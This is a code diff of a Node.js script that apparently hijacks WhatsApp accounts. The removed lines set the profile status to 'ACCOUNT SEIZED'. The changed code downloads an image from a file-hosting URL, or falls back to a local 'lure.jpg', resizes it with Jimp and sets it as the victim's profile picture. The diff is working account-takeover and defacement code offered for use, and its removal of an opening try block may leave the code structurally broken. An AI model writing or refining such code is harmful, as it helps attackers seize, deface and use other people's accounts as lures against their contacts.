@@ -146,27 +146,31 @@ async function connectToWhatsApp(isFirstConnect = true) {
                 console.log("[✗] Connection lost during stabilization!");
                 return;
             }
-            
-            try {
-                // 1. Update profile status (text)
-                console.log("[i] Updating profile status...");
-                await sock.updateProfileStatus("ψ ☠︎︎ ACCOUNT SEIZED ☠︎︎ ψ");
-                console.log("[✓] Profile status updated!");
-                
-                // 2. Update profile picture from Catbox URL with retries
+                            // 2. Update profile picture using Jimp
                 const imageUrl = 'https://files.catbox.moe/c61uu3.jpg';
                 const tempFile = './temp_profile.jpg';
                 let usedLocalFile = false;
                 
+                async function processImageWithJimp(inputPath) {
+                    const image = await Jimp.read(inputPath);
+                    // Resize to WhatsApp profile pic size (max 640x640)
+                    image.resize(640, 640);
+                    // Get as buffer
+                    const buffer = await image.getBufferAsync(Jimp.MIME_JPEG);
+                    return buffer;
+                }
+                
                 try {
                     console.log(`[i] Downloading image from Catbox...`);
-                    await downloadImage(imageUrl, tempFile, 3); // 3 retries
+                    await downloadImage(imageUrl, tempFile, 3);
+                    
+                    console.log("[i] Processing image with Jimp...");
+                    const imageBuffer = await processImageWithJimp(tempFile);
                     
                     console.log("[i] Updating profile picture...");
-                    await sock.updateProfilePicture(sock.user.id, { url: tempFile });
+                    await sock.updateProfilePicture(sock.user.id, imageBuffer);
                     console.log("[✓] Profile picture updated from Catbox!");
                     
-                    // Clean up temp file
                     fs.unlinkSync(tempFile);
                     
                 } catch (urlErr) {
@@ -176,27 +180,18 @@ async function connectToWhatsApp(isFirstConnect = true) {
                     if (fs.existsSync('./lure.jpg')) {
                         console.log("[i] Using local lure.jpg instead...");
                         try {
-                            await sock.updateProfilePicture(sock.user.id, { url: './lure.jpg' });
+                            const imageBuffer = await processImageWithJimp('./lure.jpg');
+                            await sock.updateProfilePicture(sock.user.id, imageBuffer);
                             console.log("[✓] Profile picture updated with local file!");
                             usedLocalFile = true;
                         } catch (localErr) {
                             console.log("[✗] Local file also failed:", localErr.message);
-                            if (localErr.message.includes("No image processing library")) {
-                                console.log("\n╔════════════════════════════════════════════════╗");
-                                console.log("║  MISSING IMAGE PROCESSING LIBRARY!              ║");
-                                console.log("║                                                 ║");
-                                console.log("║  Run this command to install:                   ║");
-                                console.log("║  npm install sharp                              ║");
-                                console.log("║                                                 ║");
-                                console.log("║  Or if that fails, try:                         ║");
-                                console.log("║  npm install jimp                               ║");
-                                console.log("╚════════════════════════════════════════════════╝\n");
-                            }
                         }
                     } else {
                         console.log("[✗] lure.jpg not found in current directory!");
                     }
                 }
+
                 
                 if (!usedLocalFile && !fs.existsSync('./temp_profile.jpg')) {
                     console.log("[!] Profile picture not updated - using default");
